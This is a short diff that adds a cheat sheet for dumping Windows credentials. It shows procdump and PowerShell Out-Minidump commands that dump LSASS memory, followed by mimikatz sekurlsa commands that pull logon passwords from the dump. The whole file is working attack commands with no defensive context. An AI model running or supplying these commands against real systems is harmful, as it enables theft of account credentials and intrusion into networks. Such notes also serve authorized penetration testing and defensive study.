@@ -1,0 +1,15 @@
+***** Only requires elevated prompt (no SYSTEM privs)
+procdump.exe -ma lsass.exe lsassdump
+
+***** with powershell
+Import-Module .\Out-Minidump.ps1
+Get-Process lsass | Out-Minidump
+
+***** load dump file into mimikatz
+
+log sekurlsa.log
+sekurlsa::minidump lsassdump.dmp
+sekurlsa::logonpasswords
+
+Get-Process lsass | Out-Minidump -DumpFilePath C:\temp
+
